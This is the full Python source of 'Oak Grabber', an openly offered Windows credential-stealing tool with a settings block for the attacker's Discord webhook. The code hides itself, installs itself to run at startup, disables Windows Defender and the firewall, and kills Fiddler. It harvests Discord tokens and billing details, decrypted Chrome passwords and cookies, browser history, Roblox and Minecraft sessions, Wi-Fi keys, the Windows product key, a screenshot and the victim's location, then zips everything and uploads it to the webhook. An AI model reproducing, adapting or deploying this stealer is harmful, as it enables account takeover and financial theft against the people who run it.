#config
webhook = "webhook_here"#change webhook_here to ur webhook
ping_on_run = True #get pinged when someone runs ur file (True/False)
add_to_startup = True #adds exe file to startup (True/False)
HideConsole = True #runs in the background (True/False)
zip_password = True #adds password to zip file fr (True/False)
disable_defender = True #disable windows defender (True/False)
Selfhide = True #hides the file (True/False)
fake_error_message = False #displays a fake error message when file ran. (True/False)
error_message = 'The image file C:\WINDOWS\SYSTEM32\XINPUT1_3.dll is valid, but is for a machine type other than the current machine. Select OK to continue, or CANCEL to fail the DLL load.' #custom message here


import ctypes, time, os
if os.name != 'nt': 
    exit()
if HideConsole: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)#hides console faster
else:pass
starttime = time.time()
import re, json, psutil, random, requests, subprocess, socket, wmi, sqlite3, ntpath, threading, struct, browser_cookie3, uuid, shutil, sys, pyzipper,secrets
from platform import platform as osshit
from win32crypt import CryptUnprotectData
from shutil import copy2
from tkinter import messagebox
from datetime import datetime
from base64 import b64decode
from threading import Thread
from Crypto.Cipher import AES
from PIL import ImageGrab

accounts = []
checked = []
filename =  os.path.basename(sys.argv[0])
appdata = os.getenv("localappdata")
roaming = os.getenv("appdata")
temp = os.getenv('temp')
if os.path.exists(temp):
    wiseoaktrees = ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890") for i in range(8))
    zippass = secrets.token_hex(nbytes=16)
if zip_password:pass
else:zippass = "no password"
try:
  os.mkdir(temp+f"\{wiseoaktrees}")
except:
 pass
wiseoaktree = (temp+f"\{wiseoaktrees}")
def getUser():
    return os.path.split(os.path.expanduser('~'))[-1]
if disable_defender: subprocess.run("powershell Set-MpPreference -DisableRealtimeMonitoring $true && netsh Advfirewall set allprofiles state off", shell=True, capture_output=True)
else:pass
def getLocations():
 try:
    if os.name == 'nt':
        locations = [
            f'{os.getenv("APPDATA")}\\.minecraft\\launcher_accounts.json',
            f'{os.getenv("APPDATA")}\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
        ]
        return locations
    else:
        locations = [
            f'\\home\\{getUser()}\\.minecraft\\launcher_accounts.json',
            f'\\sdcard\\games\\com.mojang\\',
            f'\\~\\Library\\Application Support\\minecraft'
            f'Apps\\com.mojang.minecraftpe\\Documents\\games\\com.mojang\\'
        ]
        return locations
 except:
        pass
def get_master_key():
    try:
        with open(appdata + '\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    except:
        pass
masterkey = get_master_key()
def decrypt_val(buff, master_key) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Failed to decrypt password"
def decrypt_password(buff, master_key):
        try:
            iv, payload = buff[3:15], buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"
def find_tokens(path):
 try:
    dctokens = ""
    path += '\\Local Storage\\leveldb'
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors='ignore') if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}', r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}'):
                for token in re.findall(regex, line):
                    checked.append(token)
                    dctokens+=(f"{token}\n\n")
    return checked
 except:
    pass
def killfiddler():
    for proc in psutil.process_iter():
        if proc.name() == "Fiddler.exe":
            proc.kill()
threading.Thread(target=killfiddler).start()
def main():
    sessionType = "N/A"
    for location in getLocations():
     if os.path.exists(location):
            auth_db = json.loads(open(location).read())['accounts']
            for d in auth_db:
                try:sessionKey = auth_db[d].get('accessToken')
                except:sessionKey = "N/A"
                username = auth_db[d].get('minecraftProfile')['name']
                sessionType = auth_db[d].get('type')
                email = auth_db[d].get('username')
                if sessionKey != None or '':
                    accounts.append([username, sessionType, email, sessionKey])
    fr = []
    count = 0
    McToken = "N/A"
    McUsername ="N/A"
    McUser ="N/A"
    McToken = "N/A"
    for account in accounts:
        if '@' in account[2]:
            name = 'Email Address'
        else:
            name = 'Xbox Username'
        try:McToken =  account[3]
        except:McToken="N/A"
        try:McUsername =  account[2]
        except:McUsername ="N/A"
        try:McUser= account[0]
        except:McUser ="N/A"
        if McToken == None or ' ' or '':
            McToken = "N/A"
        else:
         McToken = account[1]
    if add_to_startup:
     try:
        fr =  os.path.basename(sys.argv[0])
        startup =  ntpath.join(roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shutil.copy2(fr, startup)
     except:
         pass
    if Selfhide:
            ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
    os.chdir(wiseoaktree)
    if HideConsole: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
    gr = requests.get("https://ipinfo.io/json")
    if gr.status_code == 200:
            data = gr.json()
            ip = data.get('ip')
            city = data.get('city')
            country = data.get('country')
            country2 = data.get('country').lower()
            region = data.get('region')
            org = data.get('org')
            loc = data.get('loc')
            googlemap = "https://www.google.com/maps/search/google+map++" + loc
            globalinfo = f":flag_{country2}:"
    Oakname = socket.gethostname()
    pc_username = os.getenv("UserName")
    checked = []
    try:chrome_user_data = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')
    except:pass
    default_paths = {
            'Discord': roaming + '\\discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Lightcord': roaming + '\\Lightcord',
            'Discord PTB': roaming + '\\discordptb',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
            'Amigo': appdata + '\\Amigo\\User Data',
            'Torch': appdata + '\\Torch\\User Data',
            'Kometa': appdata + '\\Kometa\\User Data',
            'Orbitum': appdata + '\\Orbitum\\User Data',
            'CentBrowser': appdata + '\\CentBrowser\\User Data',
            '7Star': appdata + '\\7Star\\7Star\\User Data',
            'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
            'Chrome': chrome_user_data + '\\Default',
            'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data',
            'Google Chrome': appdata + '\\Google\\Chrome\\User Data\\Default',
            'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Defaul',
            'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default',
            'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': appdata + '\\Iridium\\User Data\\Default'
    }
    google_paths = [
            appdata + '\\Google\\Chrome\\User Data\\Default',
            appdata + '\\Google\\Chrome\\User Data\\Profile 1',
            appdata + '\\Google\\Chrome\\User Data\\Profile 2',
            appdata + '\\Google\\Chrome\\User Data\\Profile 3',
            appdata + '\\Google\\Chrome\\User Data\\Profile 4',
            appdata + '\\Google\\Chrome\\User Data\\Profile 5',
        ]
    if ping_on_run:
     message = '@everyone **someone ran ur Oak Grabber 🐥**'
    else:
     message = '**someone ran ur Oak Grabber 🐥**'
    embedMsg = '''**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062> 🐥**\n\n```No tokens found. lmao```'''
    try:
     for platforrm, path in default_paths.items():
        dctokens = ""
        vaild = ""
        if not os.path.exists(path):
            continue
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
             if token in checked:
                headersss = {'Authorization':token}
                r = requests.get(f"https://discord.com/api/v6/auth/login", headers=headersss)
                if r.status_code == 200:
                        vaild +=(f"""{token}\n\n""")
                if "You need to verify your account in order to perform this action." in r.text:
                        vaild +=(f"""{token} - locked\n\n""")
                else:
                    pass
            checked.append(token)
            dctokens+=(f"""{token}\n\n""")
            wisetokens = f"""{vaild}"""
            embedMsg = f"""**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n**Tokens:** ```{wisetokens}```"""
        else:
            embedMsg = '''**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n```No tokens found.```'''
    except Exception as fr:
      pass


    try:disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
    except:disk = "N/A"
    try:about = f"DISK: {disk}GB"
    except:about = "N/A"
    now = datetime.now()
    try:ti= (now.strftime('Date: '+'%Y/%m/%d'+'\nTime: ''%I:%M:%S'))
    except:ti = "N/A"
    try:ram3 = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576)
    except:ram3 = "N/A"
    try:ramg = (str(ram3).replace(' ', ' '))
    except:ramg = "N/A"
    try:idk = os.getcwd()
    except:idk = "N/A"
    try:ee = struct.calcsize("P")*8
    except:ee = "N/A"
    try:windowskey = subprocess.check_output("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", shell=True).decode().rstrip()
    except:windowskey = "N/A"
    try:
        platform = subprocess.check_output("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", shell=True).decode().rstrip()
        if sys.getwindowsversion().build > 20000:
            platform = platform.replace("10", "11" )
    except:platform = "N/A"
    try:hardwareid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    except:hardwareid = "N/A"
    try: cpu = subprocess.check_output('wmic cpu get name').decode().split('\n')[1].strip()
    except: cpu = 'N/A'
    try: gpu = subprocess.check_output('wmic path win32_VideoController get name').decode().split('\n')[1].strip()
    except: gpu = 'N/A'
    try: size = f'{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}'
    except: size = 'N/A'
    try: rr = subprocess.check_output('wmic path win32_VideoController get currentrefreshrate').decode().split('\n')[1].strip()
    except: rr = 'N/A'
    if rr == "":
        rr = 'N/A'
    try: bm = subprocess.check_output('wmic bios get manufacturer').decode().split('\n')[1].strip()
    except: bm = 'N/A'
    try: mn = subprocess.check_output('wmic csproduct get name').decode().split('\n')[1].strip()
    except: mn = 'N/A'
    try: ps = subprocess.check_output('tasklist').decode()
    except: ps = 'N/A'
    try: mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    except: mac = 'N/A'
    def cookies():
        if os.path.exists(appdata + '\\Google\\Chrome\\User Data'):
         with open(".\\google cookies.txt", "w", encoding="utf-8") as f:
            f.write("Google Chrome Cookies | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
         for path in google_paths:
            path += '\\Network\\Cookies'
            if os.path.exists(path):
                copy2(path, "Cookievault.db")
                conn = sqlite3.connect("Cookievault.db")
                cursor = conn.cursor()
                with open(".\\google cookies.txt", "a", encoding="utf-8") as f:
                    for result in cursor.execute("SELECT host_key, name, encrypted_value from cookies"):
                        host, name, value = result
                        value = decrypt_password(value,masterkey)
                        if host and name and value != "":
                            f.write("""===============================\nSite: {:<30} \nName: {:<30} \nValue: {:<30}\n""".format(host, name, value))
                cursor.close()
                conn.close()
                os.remove("Cookievault.db")
        else:
            pass

    def passwords():
        if os.path.exists(appdata + '\\Google\\Chrome\\User Data'):
         google_pass = ".\\google passwords.txt"
         with open(google_pass, "w", encoding="utf-8") as f:
            f.write(f"Google Chrome Passwords | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
         for path in google_paths:
            path += '\\Login Data'
            if os.path.exists(path):
                copy2(path, "Loginvault.db")
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                with open(google_pass, "a", encoding="utf-8") as f:
                    for result in cursor.execute(
                            "SELECT action_url, username_value, password_value FROM logins"):
                        url, username, password = result
                        password = decrypt_password(password, masterkey)
                        if url and username and password != "":
                            f.write("===============================\nUsername: {:<30} \nPassword: {:<30} \nSite: {:<30}\n".format(username, password, url))
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")
        else:
             pass
    def history():
        if os.path.exists(appdata + '\\Google\\Chrome\\User Data'):
         google_history = ".\\google history.txt"
         with open(google_history, "w", encoding="utf-8") as f:
            f.write(f"Google Chrome history | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
         for path in google_paths:
            path += '\\History'
            if os.path.exists(path):
                copy2(path, "Historyvault.db")
                conn = sqlite3.connect("Historyvault.db")
                cursor = conn.cursor()
                sites = []
                with open(google_history, "a", encoding="utf-8") as f:
                    for result in cursor.execute(
                            "SELECT url, title, visit_count, last_visit_time FROM urls"):
                        url, title, visit_count, last_visit_time = result
                        if url and title and visit_count and last_visit_time != "":
                            sites.append(
                                (url, title, visit_count, last_visit_time))
                        sites.sort(key=lambda x: x[3], reverse=True)
                    for site in sites:
                        f.write(f"Site: {site[1]}\n")

                cursor.close()
                conn.close()
                os.remove("Historyvault.db")
        else:
           pass

    def sysinfo():
        tree = fr'''System Info  | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber
HWID: {hardwareid}
RAM: {ramg} GB
Architecture: {ee} bit
Username: {pc_username}
{about}
Platform: {platform}
PC-Name: {Oakname}
Windows key: {windowskey}
{ti}
CPU: {cpu}
GPU: {gpu}
Refresh rate: {rr}
Model name: {mn}
Build manufacturer: {bm}
Resolution: {size}
Path: {idk}
IP INFO
IP: {ip}
City: {city}
Country: {country}
Region: {region}
GoogleMaps: {googlemap}
Service provider: {org}
MAC: {mac}
Coordinates: {loc}
Processes running
{ps}'''
        with open("system info.txt", 'w') as fp:
           fp.write(str(tree))
    def robloxcookies():
         c = ""
         try:
           cookie = str(browser_cookie3.chrome(domain_name='roblox.com'))
           c += cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
         except:
           pass
         try:
           cookie = str(browser_cookie3.firefox(domain_name='roblox.com'))
           c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
         except:
          pass
         try:
           cookie = str(browser_cookie3.opera(domain_name='roblox.com'))
           c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
         except:
           pass
         try:
           cookie = str(browser_cookie3.edge(domain_name='roblox.com'))
           c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
         except:
            pass
         try:
           cookie = str(browser_cookie3.chromium(domain_name='roblox.com'))
           c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
         except:
           pass
         try:
          cookie = str(browser_cookie3.brave(domain_name='roblox.com'))
          c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
         except:
          pass
         with open("roblox cookies.txt", "w") as fs:
          fs.write(f"Roblox cookies | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n{c}")
         if c == "":
            os.remove("roblox cookies.txt")
    def wifistealer():
     try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        w = ("wifi passwords | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\nWi-Fi Name                    | Password")
        o = ("------------------------------------------")
        for i in profiles:
          results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
          results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
           t = ("{:<30}| {:<}".format(i,results[0]))
        except IndexError:
           t = ("{:<30}| {:<}]".format(i,""))
        with open("wifi passwords.txt",'w') as ws:
           ws.write(f"{w}\n{o}\n{t}")
     except:
        pass
    def screenshot():
     try:
        ss = ImageGrab.grab()
        ss.save(f'screenshot.png')
     except:
        pass
    def mc():
        mc = ntpath.join(roaming, '.minecraft')
        if os.path.exists(mc):
         minecraft = ntpath.join(wiseoaktree, 'Minecraft')
         smh = os.makedirs(minecraft, exist_ok=True)
         to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
         for smh in to_grab:
            if ntpath.exists(ntpath.join(mc, smh)):
                shutil.copy2(ntpath.join(mc, smh), minecraft)
         pass
        else:pass
    def discordinfo():
        info = ""
        lol = ""
        for token in checked:
            languages = {
                    'da'    : 'Danish, Denmark',
                    'de'    : 'German, Germany',
                    'en-GB' : 'English, United Kingdom',
                    'en-US' : 'English, United States',
                    'es-ES' : 'Spanish, Spain',
                    'fr'    : 'French, France',
                    'hr'    : 'Croatian, Croatia',
                    'lt'    : 'Lithuanian, Lithuania',
                    'hu'    : 'Hungarian, Hungary',
                    'nl'    : 'Dutch, Netherlands',
                    'no'    : 'Norwegian, Norway',
                    'pl'    : 'Polish, Poland',
                    'pt-BR' : 'Portuguese, Brazilian, Brazil',
                    'ro'    : 'Romanian, Romania',
                    'fi'    : 'Finnish, Finland',
                    'sv-SE' : 'Swedish, Sweden',
                    'vi'    : 'Vietnamese, Vietnam',
                    'tr'    : 'Turkish, Turkey',
                    'cs'    : 'Czech, Czechia, Czech Republic',
                    'el'    : 'Greek, Greece',
                    'bg'    : 'Bulgarian, Bulgaria',
                    'ru'    : 'Russian, Russia',
                    'uk'    : 'Ukranian, Ukraine',
                    'th'    : 'Thai, Thailand',
                    'zh-CN' : 'Chinese, China',
                    'ja'    : 'Japanese',
                    'zh-TW' : 'Chinese, Taiwan',
                    'ko'    : 'Korean, Korea'
            }
            cc_digits = {
                f'american express': '3',
                f'visa': '4',
                f'mastercard': '5'
            }
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                    'Content-Type': 'application/json',
                    'Authorization': token}
            try:
             res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
            except:
                pass
            if res.status_code == 200:
                    res_json = res.json()
                    user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                    user_id = res_json['id']
                    avatar_id = res_json['avatar']
                    avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.png'
                    phone_number = res_json['phone']
                    email = res_json['email']
                    mfa_enabled = res_json['mfa_enabled']
                    flags = res_json['flags']
                    locale = res_json['locale']
                    verified = res_json['verified']

                    language = languages.get(locale)
                    from datetime import datetime
                    creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
                    has_nitro = False
                    res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                    nitro_data = res.json()
                    has_nitro = bool(len(nitro_data) > 0)

                    if has_nitro:
                        d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        days_left = abs((d2 - d1).days)
                    billing_info = []

                    for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
                        yy = x['billing_address']
                        name = yy['name']
                        address_1 = yy['line_1']
                        address_2 = yy['line_2']
                        city = yy['city']
                        postal_code = yy['postal_code']
                        state = yy['state']
                        country = yy['country']

                        if x['type'] == 1:
                            cc_brand = x['brand']
                            cc_first = cc_digits.get(cc_brand)
                            cc_last = x['last_4']
                            cc_month = str(x['expires_month'])
                            cc_year = str(x['expires_year'])
            
                            data = {
                                f'Payment Type': 'Credit Card',
                                f'Valid': not x['invalid'],
                                f'CC Holder Name ': name,
                                f'CC Brand': cc_brand.title(),
                                f'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                                f'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                                f'Address 1': address_1,
                                f'Address 2': address_2 if address_2 else '',
                                f'City': city,
                                f'Postal Code': postal_code,
                                f'State': state if state else '',
                                f'Country': country,
                                f'Default Payment Method': x['default']
                            }

                        elif x['type'] == 2:
                            data = {
                                f'Payment Type': 'PayPal',
                                f'Valid': not x['invalid'],
                                f'PayPal Name': name,
                                f'PayPal Email': x['email'],
                                f'Address 1': address_1,
                                f'Address 2': address_2 if address_2 else '',
                                f'City': city,
                                f'Postal Code': postal_code,
                                f'State': state if state else '',
                                f'Country': country,
                                f'Default Payment Method': x['default']
                            }

                        billing_info.append(data)

                    info += f"""Discordinfo | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\nBasic Information
Username: {user_name}
avatar id: {avatar_id}
User ID: {user_id}
Creation Date: {creation_date}
Avatar URL: {avatar_url if avatar_id else ""}
Token: {token}\n
Nitro: {has_nitro}\n"""
                    if has_nitro:
                        info += (f"""Expires in: {days_left} day(s)\n""")
                    else:
                        info += (f"""Expires in: None day(s)\n\n""")


                    info += f"""Phone Number: {phone_number if phone_number else "N/A"}
Email: {email if email else ""}\n"""

                    if len(billing_info) > 0:
                        info += (f"""\nBilling Information\n""")
                        if len(billing_info) == 1:
                            for x in billing_info:
                                for key, val in x.items():
                                    if not val:
                                        continue
                                    info +=('{:<23}{}{}'.format(key, val,"\n"))

                        else:
                            for i, x in enumerate(billing_info):
                                title = f'Payment Method {i + 1} ({x["Payment Type"]})'
                                info +=( title+"\n")
                                info +=( ('=' * len(title))+"\n")
                                for j, (key, val) in enumerate(x.items()):
                                    if not val or j == 0:
                                        continue
                                    info +=('        {:<23}{}{}'.format(key, val,"\n"))

                                if i < len(billing_info) - 1:
                                    info +=('\n')

                        info +=('\n')

                    info +=(f"""\nAccount Security\n""")
                    info +=(f"""2FA/MFA Enabled: {mfa_enabled}\n""")
                    info +=(f"""Flags: {flags}\n""")
                    info +=(f"""Other:\n""")
                    info +=(f"""Locale: {locale} ({language})\n""")
                    info +=(f"""Email Verified: {verified}\n""")
                    g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes",headers=headers)
                    val_codes = []
                    if "code" in g.text:
                      codes = json.loads(g.text)
                    try:
                      for code in codes:
                        val_codes.append((code['code'], code['promotion']['outbound_title']))
                    except TypeError:
                       pass

                    if val_codes == []:
                     info += f'\nNo Gift Cards Found\n'
                    else:
                     for c, t in val_codes:
                      info += f'\n{t}:\n{c}\n'
                    path = os.environ["HOMEPATH"]
                    code = '\\Downloads\\discord_backup_codes.txt'
                    info+=(f"\n\nDiscord Backup Codes\n\n")
                    if os.path.exists(path + code):
                                    with open(path + code, 'r') as g:
                                        for line in g.readlines():
                                            if line.startswith("*"):
                                                info+=(line)
                    else:
                                    info+=("No discord backup codes found")
            elif res.status_code == 401:
                    info +=(f"""Invalid token\n""")
                    pass
            
        with open ("discord info.txt","w") as f:
         f.write(str(info))
        if info == "":
            os.remove("discord info.txt")

    def get_data():
        epic = appdata + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"
        with open(os.path.join(wiseoaktree, "Epic games data.txt"), 'w', encoding="cp437") as g:
            g.write(f"Epic Games Offline Data | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
            if os.path.exists(epic):
                with open(epic, "r") as f:
                    for line in f.readlines():
                        if line.startswith("Data="):
                            g.write(line.split('Data=')[1].strip())
            else:
                g.close()
                os.remove("Epic games data.txt")
                pass
    def zip():
            password = bytes('{}'.format(zippass),encoding='utf8')
            os.chdir(temp)
            if zip_password:
                with pyzipper.AESZipFile(f'Oak-Logs-{pc_username}.zip','w', compression=pyzipper.ZIP_LZMA,encryption=pyzipper.WZ_AES) as zf:
                   zf.setpassword(password)
                   for dirname, subdirs, files in os.walk(wiseoaktree):
                       for filename in files:
                           os.chdir(wiseoaktree)
                           try:zf.write(filename)
                           except:pass
                   for dirname, subdirs, files in os.walk("minecraft"):
                               zf.write(dirname)
                               for filename in files:
                                   zf.write(os.path.join(dirname, filename))
                   zf.close()
            else:
             with pyzipper.AESZipFile(f'Oak-Logs-{pc_username}.zip','w', compression=pyzipper.ZIP_LZMA) as zf:
                   for dirname, subdirs, files in os.walk(wiseoaktree):
                       for filename in files:
                           os.chdir(wiseoaktree)
                           try:zf.write(filename)
                           except:pass
                   for dirname, subdirs, files in os.walk("minecraft"):
                               zf.write(dirname)
                               for filename in files:
                                   zf.write(os.path.join(dirname, filename))
                   zf.close()

    def upload():
     lol = ""
     try:
      vaildc = 0
      fr = token
      lmao = fr.split("\n")
      for i in lmao:
       if i:
              vaildc += 1
      headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
      }
      res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
      if res.status_code == 200:
        res_json = res.json()
        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
        user_id = res_json['id']
        avatar_id = res_json['avatar']
        avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.png'
        phone_number = res_json['phone']
        email = res_json['email']
        from datetime import datetime
        creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        has_nitro = False
        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
        nitro_data = res.json()
        has_nitro = bool(len(nitro_data) > 0)

      if has_nitro:
            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            days_left = abs((d2 - d1).days)
      lol += f"""**Username:** `{user_name}`\n**User ID:** `{user_id}`\n**Creation Date:** `{creation_date}`\n**Avatar URL:** [Avatar URL]({avatar_url if avatar_id else ""})\n**Nitro:** `{has_nitro}`"""
      if has_nitro:lol += (f"""\n**Nitro Expires in:** `{days_left} day(s)`\n""")
      lol += f"""**Phone Number:** `{phone_number if phone_number else "N/A"}`\n**Email:** `{email if email else ""}`\n**Token:** `{token}`"""
     except:
        lol += f"""**Username:** `N/A`\n**User ID:**`N/A`\n**Creation Date:** `N/A`\n**Avatar URL:** `N/A`\n**Nitro:** `N/A`"""
        lol += f"""\n**Phone Number:** `N/A`\n**Email:** `N/A`\n**Token:** `N/A`"""
     os.chdir(wiseoaktree)
     fc = 0
     f = f"📁{os.path.basename(wiseoaktree)}\n"
     f2 = ""
     for x in os.listdir():
      if x.endswith("craft"):
        f += f"│ {x} 📁\n"
        fc += 1
      if x.endswith(".txt") or x.endswith(".png"):
                 f += f"│ {x}\n"
                 fc += 1
     f2 += f"└ Oak-Logs-{pc_username}.zip"
     embed = {
                 "username": f"{pc_username} | Oak Grabber",
                 "content": message,
                 "avatar_url":"https://i.imgur.com/bbWgtHI.png",
                 "title": "__Oak Grabber__",
                 "embeds": [
                     {
                         "author": {
                             "name": "Wise Oak Tree for life 😎",
                             "url": "https://github.com/j0taro/Oak-token-Grabber",
                             "icon_url": "https://i.imgur.com/bbWgtHI.png"
                         },
                         "description": f"""{embedMsg}\n**__PC INFO__ <:pc:1035526269925867640>**\n**RAM:** `{ramg}`\n**Disk:** `{disk}GB`\n**CPU:**`{cpu}`\n**GPU:**`{gpu}`\n**Refresh rate:** `{rr}`\n**Model name:** `{mn}`\n**Build manufacturer:** `{bm}`\n**Resolution:** `{size}`\n**Platform:** `{platform}`\n**PC-Name:** `{Oakname}`\n**PC-User:** `{pc_username}`\n**__IP INFO__ <:loc:1035525770258415657>**\n**IP:** `{ip}`\n**City:** `{city}`\n**Country:** `{country}`\n**Country Emoji:** {globalinfo}\n**Region:** `{region}`\n**Org:** `{org}`\n**Mac:** `{mac}`\n**Loc:** `{loc}`\n**Googlemap:** [Googlemap location]({"https://www.google.com/maps/search/google+map++" + loc})\n__**Minecraft Info <:fr:1035524460939329617>**__ \n**Minecraft Profile:** `{McUsername}`\n**Token:** `{McToken}`\n **Account type:** `{sessionType}`\n **Name:** `{McUser}`\n**__Discord info__**\n{lol}\n**Elapsed time:** `{time.time() - starttime}`\n**__ZIP PASS__:** `{zippass}`\n```yaml\n{fc} Files Found:\n{f}{f2}\nTokens found: {vaildc}```""",
                         "color": 0xff0000,
                         "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                         "thumbnail": {
                           "url": "https://i.imgur.com/dEiUxyB.png"
                         },
                          "footer": {
                             "text": "Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber",
                             "icon_url": "https://i.imgur.com/dEiUxyB.png"
                         }
                     }
                 ]
             }
     file = {
        "username": f"{pc_username} | Oak Grabber",
        "avatar_url":"https://i.imgur.com/bbWgtHI.png"}
     os.chdir(temp)
     with open(f'Oak-Logs-{pc_username}.zip', 'rb') as f:
        requests.post(webhook, json = embed)
        requests.post(webhook,data=file ,files={'upload_file': f})
    def cleanup():
        os.chdir(temp)
        shutil.rmtree(wiseoaktree)
        os.remove(f"Oak-Logs-{pc_username}.zip")
    def error():
     if fake_error_message:
      messagebox.showerror('Error', error_message)
    wifistealer()
    mc()
    get_data()
